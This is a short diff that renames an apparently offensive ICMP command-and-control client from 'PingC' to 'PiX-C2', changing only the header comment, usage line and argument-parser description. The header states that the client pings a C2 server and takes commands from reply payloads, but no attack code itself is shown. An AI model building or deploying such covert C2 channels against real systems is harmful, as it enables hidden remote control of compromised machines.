@@ -1,10 +1,10 @@
 #! /usr/bin/env python
 
-# PingC ICMP command and control client application
+# PiX-C2 ICMP command and control client application
 # by NoCow
 # This is the client side application for my ICMP C2 project. The client will periodically ping the C2 server
 #  and receive commands in the data portion of the reply. I am currently using Scapy for the packet building
-# Usage: ./pingc.py <IP>
+# Usage: ./pix-c.py <IP>
 
 import fileinput
 import sys
@@ -364,7 +364,7 @@ def main(dest,flag):
 
 if __name__ == "__main__":
   global flag
-  parser = argparse.ArgumentParser(version="%prog 1.0",description="Pingc client for icmp based C2")
+  parser = argparse.ArgumentParser(version="%prog 1.0",description="PiX-C2 client for icmp based C2")
   parser.add_argument('dest', help='Destination IP or hostname for C2', metavar='DEST') 
   parser.add_argument("-d", "--debug", dest='debug', help="debug level 1-2", metavar="DEBUG", default=0)
   args = parser.parse_args()
